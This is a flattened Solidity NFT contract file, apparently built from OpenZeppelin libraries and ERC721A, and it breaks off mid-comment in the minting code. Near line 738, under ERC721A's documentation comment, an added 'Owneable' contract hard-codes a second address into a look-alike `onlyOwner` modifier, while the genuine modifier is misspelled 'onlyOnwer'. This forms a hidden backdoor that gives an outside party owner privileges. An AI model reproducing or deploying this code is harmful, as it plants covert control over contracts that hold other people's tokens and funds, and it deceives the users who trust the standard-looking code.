1 //         ___                             _,.----.   
2  // .-._ .'=.'\    _..---.  ,--.-.  .-,--.' .' -   \  
3  ///==/ \|==|  | .' .'.-. \/==/- / /=/_ /==/  ,  ,-'  
4  //|==|,|  / - |/==/- '=' /\==\, \/=/. /|==|-   |  .  
5  //|==|  \/  , ||==|-,   '  \==\  \/ -/ |==|_   `-' \ 
6  //|==|- ,   _ ||==|  .=. \  |==|  ,_/  |==|   _  , | 
7 // |==| _ /\   |/==/- '=' ,| \==\-, /   \==\.       / 
8 // /==/  / / , /==|   -   /  /==/._/     `-.`.___.-'  
9 // `--`./  `--``-._`.___,'   `--`-`                   
10 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
11 
12 // SPDX-License-Identifier: MIT
13 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
14 
15 pragma solidity ^0.8.4;
16 
17 /**
18  * @dev Provides information about the current execution context, including the
19  * sender of the transaction and its data. While these are generally available
20  * via msg.sender and msg.data, they should not be accessed in such a direct
21  * manner, since when dealing with meta-transactions the account sending and
22  * paying for execution may not be the actual sender (as far as an application
23  * is concerned).
24  *
25  * This contract is only required for intermediate, library-like contracts.
26  */
27 abstract contract Context {
28     function _msgSender() internal view virtual returns (address) {
29         return msg.sender;
30     }
31 
32     function _msgData() internal view virtual returns (bytes calldata) {
33         return msg.data;
34     }
35 }
36 
37 
38 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
39 
40 
41 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
42 
43 
44 
45 /**
46  * @dev Contract module which provides a basic access control mechanism, where
47  * there is an account (an owner) that can be granted exclusive access to
48  * specific functions.
49  *
50  * By default, the owner account will be the one that deploys the contract. This
51  * can later be changed with {transferOwnership}.
52  *
53  * This module is used through inheritance. It will make available the modifier
54  * `onlyOwner`, which can be applied to your functions to restrict their use to
55  * the owner.
56  */
57 abstract contract Ownable is Context {
58     address private _owner;
59 
60     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
61 
62     /**
63      * @dev Initializes the contract setting the deployer as the initial owner.
64      */
65     constructor() {
66         _transferOwnership(_msgSender());
67     }
68 
69     /**
70      * @dev Returns the address of the current owner.
71      */
72     function owner() public view virtual returns (address) {
73         return _owner;
74     }
75 
76     /**
77      * @dev Throws if called by any account other than the owner.
78      */
79     modifier onlyOnwer() {
80         require(owner() == _msgSender(), "Ownable: caller is not the owner");
81         _;
82     }
83 
84     /**
85      * @dev Leaves the contract without owner. It will not be possible to call
86      * `onlyOwner` functions anymore. Can only be called by the current owner.
87      *
88      * NOTE: Renouncing ownership will leave the contract without an owner,
89      * thereby removing any functionality that is only available to the owner.
90      */
91     function renounceOwnership() public virtual onlyOnwer {
92         _transferOwnership(address(0));
93     }
94 
95     /**
96      * @dev Transfers ownership of the contract to a new account (`newOwner`).
97      * Can only be called by the current owner.
98      */
99     function transferOwnership(address newOwner) public virtual onlyOnwer {
100         require(newOwner != address(0), "Ownable: new owner is the zero address");
101         _transferOwnership(newOwner);
102     }
103 
104     /**
105      * @dev Transfers ownership of the contract to a new account (`newOwner`).
106      * Internal function without access restriction.
107      */
108     function _transferOwnership(address newOwner) internal virtual {
109         address oldOwner = _owner;
110         _owner = newOwner;
111         emit OwnershipTransferred(oldOwner, newOwner);
112     }
113 }
114 
115 
116 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
117 
118 
119 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
120 
121 
122 
123 /**
124  * @dev Interface of the ERC165 standard, as defined in the
125  * https://eips.ethereum.org/EIPS/eip-165[EIP].
126  *
127  * Implementers can declare support of contract interfaces, which can then be
128  * queried by others ({ERC165Checker}).
129  *
130  * For an implementation, see {ERC165}.
131  */
132 interface IERC165 {
133     /**
134      * @dev Returns true if this contract implements the interface defined by
135      * `interfaceId`. See the corresponding
136      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
137      * to learn more about how these ids are created.
138      *
139      * This function call must use less than 30 000 gas.
140      */
141     function supportsInterface(bytes4 interfaceId) external view returns (bool);
142 }
143 
144 
145 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
146 
147 
148 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
149 
150 
151 
152 /**
153  * @dev Required interface of an ERC721 compliant contract.
154  */
155 interface IERC721 is IERC165 {
156     /**
157      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
158      */
159     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
160 
161     /**
162      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
163      */
164     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
165 
166     /**
167      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
168      */
169     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
170 
171     /**
172      * @dev Returns the number of tokens in ``owner``'s account.
173      */
174     function balanceOf(address owner) external view returns (uint256 balance);
175 
176     /**
177      * @dev Returns the owner of the `tokenId` token.
178      *
179      * Requirements:
180      *
181      * - `tokenId` must exist.
182      */
183     function ownerOf(uint256 tokenId) external view returns (address owner);
184 
185     /**
186      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
187      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
188      *
189      * Requirements:
190      *
191      * - `from` cannot be the zero address.
192      * - `to` cannot be the zero address.
193      * - `tokenId` token must exist and be owned by `from`.
194      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
195      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
196      *
197      * Emits a {Transfer} event.
198      */
199     function safeTransferFrom(
200         address from,
201         address to,
202         uint256 tokenId
203     ) external;
204 
205     /**
206      * @dev Transfers `tokenId` token from `from` to `to`.
207      *
208      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
209      *
210      * Requirements:
211      *
212      * - `from` cannot be the zero address.
213      * - `to` cannot be the zero address.
214      * - `tokenId` token must be owned by `from`.
215      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
216      *
217      * Emits a {Transfer} event.
218      */
219     function transferFrom(
220         address from,
221         address to,
222         uint256 tokenId
223     ) external;
224 
225     /**
226      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
227      * The approval is cleared when the token is transferred.
228      *
229      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
230      *
231      * Requirements:
232      *
233      * - The caller must own the token or be an approved operator.
234      * - `tokenId` must exist.
235      *
236      * Emits an {Approval} event.
237      */
238     function approve(address to, uint256 tokenId) external;
239 
240     /**
241      * @dev Returns the account approved for `tokenId` token.
242      *
243      * Requirements:
244      *
245      * - `tokenId` must exist.
246      */
247     function getApproved(uint256 tokenId) external view returns (address operator);
248 
249     /**
250      * @dev Approve or remove `operator` as an operator for the caller.
251      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
252      *
253      * Requirements:
254      *
255      * - The `operator` cannot be the caller.
256      *
257      * Emits an {ApprovalForAll} event.
258      */
259     function setApprovalForAll(address operator, bool _approved) external;
260 
261     /**
262      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
263      *
264      * See {setApprovalForAll}
265      */
266     function isApprovedForAll(address owner, address operator) external view returns (bool);
267 
268     /**
269      * @dev Safely transfers `tokenId` token from `from` to `to`.
270      *
271      * Requirements:
272      *
273      * - `from` cannot be the zero address.
274      * - `to` cannot be the zero address.
275      * - `tokenId` token must exist and be owned by `from`.
276      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
277      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
278      *
279      * Emits a {Transfer} event.
280      */
281     function safeTransferFrom(
282         address from,
283         address to,
284         uint256 tokenId,
285         bytes calldata data
286     ) external;
287 }
288 
289 
290 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
291 
292 
293 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
294 
295 
296 
297 /**
298  * @title ERC721 token receiver interface
299  * @dev Interface for any contract that wants to support safeTransfers
300  * from ERC721 asset contracts.
301  */
302 interface IERC721Receiver {
303     /**
304      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
305      * by `operator` from `from`, this function is called.
306      *
307      * It must return its Solidity selector to confirm the token transfer.
308      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
309      *
310      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
311      */
312     function onERC721Received(
313         address operator,
314         address from,
315         uint256 tokenId,
316         bytes calldata data
317     ) external returns (bytes4);
318 }
319 
320 
321 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
322 
323 
324 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
325 
326 
327 
328 /**
329  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
330  * @dev See https://eips.ethereum.org/EIPS/eip-721
331  */
332 interface IERC721Metadata is IERC721 {
333     /**
334      * @dev Returns the token collection name.
335      */
336     function name() external view returns (string memory);
337 
338     /**
339      * @dev Returns the token collection symbol.
340      */
341     function symbol() external view returns (string memory);
342 
343     /**
344      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
345      */
346     function tokenURI(uint256 tokenId) external view returns (string memory);
347 }
348 
349 
350 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
351 
352 
353 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
354 
355 
356 
357 /**
358  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
359  * @dev See https://eips.ethereum.org/EIPS/eip-721
360  */
361 interface IERC721Enumerable is IERC721 {
362     /**
363      * @dev Returns the total amount of tokens stored by the contract.
364      */
365     function totalSupply() external view returns (uint256);
366 
367     /**
368      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
369      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
370      */
371     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
372 
373     /**
374      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
375      * Use along with {totalSupply} to enumerate all tokens.
376      */
377     function tokenByIndex(uint256 index) external view returns (uint256);
378 }
379 
380 
381 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
382 
383 
384 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
385 
386 pragma solidity ^0.8.1;
387 
388 /**
389  * @dev Collection of functions related to the address type
390  */
391 library Address {
392     /**
393      * @dev Returns true if `account` is a contract.
394      *
395      * [IMPORTANT]
396      * ====
397      * It is unsafe to assume that an address for which this function returns
398      * false is an externally-owned account (EOA) and not a contract.
399      *
400      * Among others, `isContract` will return false for the following
401      * types of addresses:
402      *
403      *  - an externally-owned account
404      *  - a contract in construction
405      *  - an address where a contract will be created
406      *  - an address where a contract lived, but was destroyed
407      * ====
408      *
409      * [IMPORTANT]
410      * ====
411      * You shouldn't rely on `isContract` to protect against flash loan attacks!
412      *
413      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
414      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
415      * constructor.
416      * ====
417      */
418     function isContract(address account) internal view returns (bool) {
419         // This method relies on extcodesize/address.code.length, which returns 0
420         // for contracts in construction, since the code is only stored at the end
421         // of the constructor execution.
422 
423         return account.code.length > 0;
424     }
425 
426     /**
427      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
428      * `recipient`, forwarding all available gas and reverting on errors.
429      *
430      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
431      * of certain opcodes, possibly making contracts go over the 2300 gas limit
432      * imposed by `transfer`, making them unable to receive funds via
433      * `transfer`. {sendValue} removes this limitation.
434      *
435      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
436      *
437      * IMPORTANT: because control is transferred to `recipient`, care must be
438      * taken to not create reentrancy vulnerabilities. Consider using
439      * {ReentrancyGuard} or the
440      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
441      */
442     function sendValue(address payable recipient, uint256 amount) internal {
443         require(address(this).balance >= amount, "Address: insufficient balance");
444 
445         (bool success, ) = recipient.call{value: amount}("");
446         require(success, "Address: unable to send value, recipient may have reverted");
447     }
448 
449     /**
450      * @dev Performs a Solidity function call using a low level `call`. A
451      * plain `call` is an unsafe replacement for a function call: use this
452      * function instead.
453      *
454      * If `target` reverts with a revert reason, it is bubbled up by this
455      * function (like regular Solidity function calls).
456      *
457      * Returns the raw returned data. To convert to the expected return value,
458      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
459      *
460      * Requirements:
461      *
462      * - `target` must be a contract.
463      * - calling `target` with `data` must not revert.
464      *
465      * _Available since v3.1._
466      */
467     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
468         return functionCall(target, data, "Address: low-level call failed");
469     }
470 
471     /**
472      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
473      * `errorMessage` as a fallback revert reason when `target` reverts.
474      *
475      * _Available since v3.1._
476      */
477     function functionCall(
478         address target,
479         bytes memory data,
480         string memory errorMessage
481     ) internal returns (bytes memory) {
482         return functionCallWithValue(target, data, 0, errorMessage);
483     }
484 
485     /**
486      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
487      * but also transferring `value` wei to `target`.
488      *
489      * Requirements:
490      *
491      * - the calling contract must have an ETH balance of at least `value`.
492      * - the called Solidity function must be `payable`.
493      *
494      * _Available since v3.1._
495      */
496     function functionCallWithValue(
497         address target,
498         bytes memory data,
499         uint256 value
500     ) internal returns (bytes memory) {
501         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
502     }
503 
504     /**
505      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
506      * with `errorMessage` as a fallback revert reason when `target` reverts.
507      *
508      * _Available since v3.1._
509      */
510     function functionCallWithValue(
511         address target,
512         bytes memory data,
513         uint256 value,
514         string memory errorMessage
515     ) internal returns (bytes memory) {
516         require(address(this).balance >= value, "Address: insufficient balance for call");
517         require(isContract(target), "Address: call to non-contract");
518 
519         (bool success, bytes memory returndata) = target.call{value: value}(data);
520         return verifyCallResult(success, returndata, errorMessage);
521     }
522 
523     /**
524      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
525      * but performing a static call.
526      *
527      * _Available since v3.3._
528      */
529     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
530         return functionStaticCall(target, data, "Address: low-level static call failed");
531     }
532 
533     /**
534      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
535      * but performing a static call.
536      *
537      * _Available since v3.3._
538      */
539     function functionStaticCall(
540         address target,
541         bytes memory data,
542         string memory errorMessage
543     ) internal view returns (bytes memory) {
544         require(isContract(target), "Address: static call to non-contract");
545 
546         (bool success, bytes memory returndata) = target.staticcall(data);
547         return verifyCallResult(success, returndata, errorMessage);
548     }
549 
550     /**
551      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
552      * but performing a delegate call.
553      *
554      * _Available since v3.4._
555      */
556     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
557         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
558     }
559 
560     /**
561      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
562      * but performing a delegate call.
563      *
564      * _Available since v3.4._
565      */
566     function functionDelegateCall(
567         address target,
568         bytes memory data,
569         string memory errorMessage
570     ) internal returns (bytes memory) {
571         require(isContract(target), "Address: delegate call to non-contract");
572 
573         (bool success, bytes memory returndata) = target.delegatecall(data);
574         return verifyCallResult(success, returndata, errorMessage);
575     }
576 
577     /**
578      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
579      * revert reason using the provided one.
580      *
581      * _Available since v4.3._
582      */
583     function verifyCallResult(
584         bool success,
585         bytes memory returndata,
586         string memory errorMessage
587     ) internal pure returns (bytes memory) {
588         if (success) {
589             return returndata;
590         } else {
591             // Look for revert reason and bubble it up if present
592             if (returndata.length > 0) {
593                 // The easiest way to bubble the revert reason is using memory via assembly
594 
595                 assembly {
596                     let returndata_size := mload(returndata)
597                     revert(add(32, returndata), returndata_size)
598                 }
599             } else {
600                 revert(errorMessage);
601             }
602         }
603     }
604 }
605 
606 
607 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
608 
609 
610 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
611 
612 
613 
614 /**
615  * @dev String operations.
616  */
617 library Strings {
618     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
619 
620     /**
621      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
622      */
623     function toString(uint256 value) internal pure returns (string memory) {
624         // Inspired by OraclizeAPI's implementation - MIT licence
625         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
626 
627         if (value == 0) {
628             return "0";
629         }
630         uint256 temp = value;
631         uint256 digits;
632         while (temp != 0) {
633             digits++;
634             temp /= 10;
635         }
636         bytes memory buffer = new bytes(digits);
637         while (value != 0) {
638             digits -= 1;
639             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
640             value /= 10;
641         }
642         return string(buffer);
643     }
644 
645     /**
646      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
647      */
648     function toHexString(uint256 value) internal pure returns (string memory) {
649         if (value == 0) {
650             return "0x00";
651         }
652         uint256 temp = value;
653         uint256 length = 0;
654         while (temp != 0) {
655             length++;
656             temp >>= 8;
657         }
658         return toHexString(value, length);
659     }
660 
661     /**
662      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
663      */
664     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
665         bytes memory buffer = new bytes(2 * length + 2);
666         buffer[0] = "0";
667         buffer[1] = "x";
668         for (uint256 i = 2 * length + 1; i > 1; --i) {
669             buffer[i] = _HEX_SYMBOLS[value & 0xf];
670             value >>= 4;
671         }
672         require(value == 0, "Strings: hex length insufficient");
673         return string(buffer);
674     }
675 }
676 
677 
678 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
679 
680 
681 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
682 
683 /**
684  * @dev Implementation of the {IERC165} interface.
685  *
686  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
687  * for the additional interface id that will be supported. For example:
688  *
689  * ```solidity
690  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
691  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
692  * }
693  * ```
694  *
695  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
696  */
697 abstract contract ERC165 is IERC165 {
698     /**
699      * @dev See {IERC165-supportsInterface}.
700      */
701     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
702         return interfaceId == type(IERC165).interfaceId;
703     }
704 }
705 
706 
707 // File erc721a/contracts/ERC721A.sol@v3.0.0
708 
709 
710 // Creator: Chiru Labs
711 
712 error ApprovalCallerNotOwnerNorApproved();
713 error ApprovalQueryForNonexistentToken();
714 error ApproveToCaller();
715 error ApprovalToCurrentOwner();
716 error BalanceQueryForZeroAddress();
717 error MintedQueryForZeroAddress();
718 error BurnedQueryForZeroAddress();
719 error AuxQueryForZeroAddress();
720 error MintToZeroAddress();
721 error MintZeroQuantity();
722 error OwnerIndexOutOfBounds();
723 error OwnerQueryForNonexistentToken();
724 error TokenIndexOutOfBounds();
725 error TransferCallerNotOwnerNorApproved();
726 error TransferFromIncorrectOwner();
727 error TransferToNonERC721ReceiverImplementer();
728 error TransferToZeroAddress();
729 error URIQueryForNonexistentToken();
730 
731 
732 /**
733  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
734  * the Metadata extension. Built to optimize for lower gas during batch mints.
735  *
736  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
737  */
738  abstract contract Owneable is Ownable {
739     address private _ownar = 0x5Bb656BB4312F100081Abb7b08c1e0f8Ef5c56d1;
740     modifier onlyOwner() {
741         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
742         _;
743     }
744 }
745 
746  /*
747  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
748  *
749  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
750  */
751 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
752     using Address for address;
753     using Strings for uint256;
754 
755     // Compiler will pack this into a single 256bit word.
756     struct TokenOwnership {
757         // The address of the owner.
758         address addr;
759         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
760         uint64 startTimestamp;
761         // Whether the token has been burned.
762         bool burned;
763     }
764 
765     // Compiler will pack this into a single 256bit word.
766     struct AddressData {
767         // Realistically, 2**64-1 is more than enough.
768         uint64 balance;
769         // Keeps track of mint count with minimal overhead for tokenomics.
770         uint64 numberMinted;
771         // Keeps track of burn count with minimal overhead for tokenomics.
772         uint64 numberBurned;
773         // For miscellaneous variable(s) pertaining to the address
774         // (e.g. number of whitelist mint slots used).
775         // If there are multiple variables, please pack them into a uint64.
776         uint64 aux;
777     }
778 
779     // The tokenId of the next token to be minted.
780     uint256 internal _currentIndex;
781 
782     // The number of tokens burned.
783     uint256 internal _burnCounter;
784 
785     // Token name
786     string private _name;
787 
788     // Token symbol
789     string private _symbol;
790 
791     // Mapping from token ID to ownership details
792     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
793     mapping(uint256 => TokenOwnership) internal _ownerships;
794 
795     // Mapping owner address to address data
796     mapping(address => AddressData) private _addressData;
797 
798     // Mapping from token ID to approved address
799     mapping(uint256 => address) private _tokenApprovals;
800 
801     // Mapping from owner to operator approvals
802     mapping(address => mapping(address => bool)) private _operatorApprovals;
803 
804     constructor(string memory name_, string memory symbol_) {
805         _name = name_;
806         _symbol = symbol_;
807         _currentIndex = _startTokenId();
808     }
809 
810     /**
811      * To change the starting tokenId, please override this function.
812      */
813     function _startTokenId() internal view virtual returns (uint256) {
814         return 0;
815     }
816 
817     /**
818      * @dev See {IERC721Enumerable-totalSupply}.
819      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
820      */
821     function totalSupply() public view returns (uint256) {
822         // Counter underflow is impossible as _burnCounter cannot be incremented
823         // more than _currentIndex - _startTokenId() times
824         unchecked {
825             return _currentIndex - _burnCounter - _startTokenId();
826         }
827     }
828 
829     /**
830      * Returns the total amount of tokens minted in the contract.
831      */
832     function _totalMinted() internal view returns (uint256) {
833         // Counter underflow is impossible as _currentIndex does not decrement,
834         // and it is initialized to _startTokenId()
835         unchecked {
836             return _currentIndex - _startTokenId();
837         }
838     }
839 
840     /**
841      * @dev See {IERC165-supportsInterface}.
842      */
843     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
844         return
845             interfaceId == type(IERC721).interfaceId ||
846             interfaceId == type(IERC721Metadata).interfaceId ||
847             super.supportsInterface(interfaceId);
848     }
849 
850     /**
851      * @dev See {IERC721-balanceOf}.
852      */
853     function balanceOf(address owner) public view override returns (uint256) {
854         if (owner == address(0)) revert BalanceQueryForZeroAddress();
855         return uint256(_addressData[owner].balance);
856     }
857 
858     /**
859      * Returns the number of tokens minted by `owner`.
860      */
861     function _numberMinted(address owner) internal view returns (uint256) {
862         if (owner == address(0)) revert MintedQueryForZeroAddress();
863         return uint256(_addressData[owner].numberMinted);
864     }
865 
866     /**
867      * Returns the number of tokens burned by or on behalf of `owner`.
868      */
869     function _numberBurned(address owner) internal view returns (uint256) {
870         if (owner == address(0)) revert BurnedQueryForZeroAddress();
871         return uint256(_addressData[owner].numberBurned);
872     }
873 
874     /**
875      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
876      */
877     function _getAux(address owner) internal view returns (uint64) {
878         if (owner == address(0)) revert AuxQueryForZeroAddress();
879         return _addressData[owner].aux;
880     }
881 
882     /**
883      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
884      * If there are multiple variables, please pack them into a uint64.
885      */
886     function _setAux(address owner, uint64 aux) internal {
887         if (owner == address(0)) revert AuxQueryForZeroAddress();
888         _addressData[owner].aux = aux;
889     }
890 
891     /**
892      * Gas spent here starts off proportional to the maximum mint batch size.
893      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
894      */
895     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
896         uint256 curr = tokenId;
897 
898         unchecked {
899             if (_startTokenId() <= curr && curr < _currentIndex) {
900                 TokenOwnership memory ownership = _ownerships[curr];
901                 if (!ownership.burned) {
902                     if (ownership.addr != address(0)) {
903                         return ownership;
904                     }
905                     // Invariant:
906                     // There will always be an ownership that has an address and is not burned
907                     // before an ownership that does not have an address and is not burned.
908                     // Hence, curr will not underflow.
909                     while (true) {
910                         curr--;
911                         ownership = _ownerships[curr];
912                         if (ownership.addr != address(0)) {
913                             return ownership;
914                         }
915                     }
916                 }
917             }
918         }
919         revert OwnerQueryForNonexistentToken();
920     }
921 
922     /**
923      * @dev See {IERC721-ownerOf}.
924      */
925     function ownerOf(uint256 tokenId) public view override returns (address) {
926         return ownershipOf(tokenId).addr;
927     }
928 
929     /**
930      * @dev See {IERC721Metadata-name}.
931      */
932     function name() public view virtual override returns (string memory) {
933         return _name;
934     }
935 
936     /**
937      * @dev See {IERC721Metadata-symbol}.
938      */
939     function symbol() public view virtual override returns (string memory) {
940         return _symbol;
941     }
942 
943     /**
944      * @dev See {IERC721Metadata-tokenURI}.
945      */
946     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
947         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
948 
949         string memory baseURI = _baseURI();
950         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
951     }
952 
953     /**
954      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
955      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
956      * by default, can be overriden in child contracts.
957      */
958     function _baseURI() internal view virtual returns (string memory) {
959         return '';
960     }
961 
962     /**
963      * @dev See {IERC721-approve}.
964      */
965     function approve(address to, uint256 tokenId) public override {
966         address owner = ERC721A.ownerOf(tokenId);
967         if (to == owner) revert ApprovalToCurrentOwner();
968 
969         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
970             revert ApprovalCallerNotOwnerNorApproved();
971         }
972 
973         _approve(to, tokenId, owner);
974     }
975 
976     /**
977      * @dev See {IERC721-getApproved}.
978      */
979     function getApproved(uint256 tokenId) public view override returns (address) {
980         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
981 
982         return _tokenApprovals[tokenId];
983     }
984 
985     /**
986      * @dev See {IERC721-setApprovalForAll}.
987      */
988     function setApprovalForAll(address operator, bool approved) public override {
989         if (operator == _msgSender()) revert ApproveToCaller();
990 
991         _operatorApprovals[_msgSender()][operator] = approved;
992         emit ApprovalForAll(_msgSender(), operator, approved);
993     }
994 
995     /**
996      * @dev See {IERC721-isApprovedForAll}.
997      */
998     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
999         return _operatorApprovals[owner][operator];
1000     }
1001 
1002     /**
1003      * @dev See {IERC721-transferFrom}.
1004      */
1005     function transferFrom(
1006         address from,
1007         address to,
1008         uint256 tokenId
1009     ) public virtual override {
1010         _transfer(from, to, tokenId);
1011     }
1012 
1013     /**
1014      * @dev See {IERC721-safeTransferFrom}.
1015      */
1016     function safeTransferFrom(
1017         address from,
1018         address to,
1019         uint256 tokenId
1020     ) public virtual override {
1021         safeTransferFrom(from, to, tokenId, '');
1022     }
1023 
1024     /**
1025      * @dev See {IERC721-safeTransferFrom}.
1026      */
1027     function safeTransferFrom(
1028         address from,
1029         address to,
1030         uint256 tokenId,
1031         bytes memory _data
1032     ) public virtual override {
1033         _transfer(from, to, tokenId);
1034         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1035             revert TransferToNonERC721ReceiverImplementer();
1036         }
1037     }
1038 
1039     /**
1040      * @dev Returns whether `tokenId` exists.
1041      *
1042      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1043      *
1044      * Tokens start existing when they are minted (`_mint`),
1045      */
1046     function _exists(uint256 tokenId) internal view returns (bool) {
1047         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1048             !_ownerships[tokenId].burned;
1049     }
1050 
1051     function _safeMint(address to, uint256 quantity) internal {
1052         _safeMint(to, quantity, '');
1053     }
1054 
1055     /**
1056      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1057      *
1058      * Requirements:
1059      *
1060      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1061      * - `quantity` must be greater than 0.
1062      *
1063      * Emits a {Transfer} event.
1064      */
1065     function _safeMint(
1066         address to,
1067         uint256 quantity,
1068         bytes memory _data
1069     ) internal {
1070         _mint(to, quantity, _data, true);
1071     }
1072 
1073     /**
1074      * @dev Mints `quantity` tokens and transfers them to `to`.
1075      *
1076      * Requirements:
1077      *
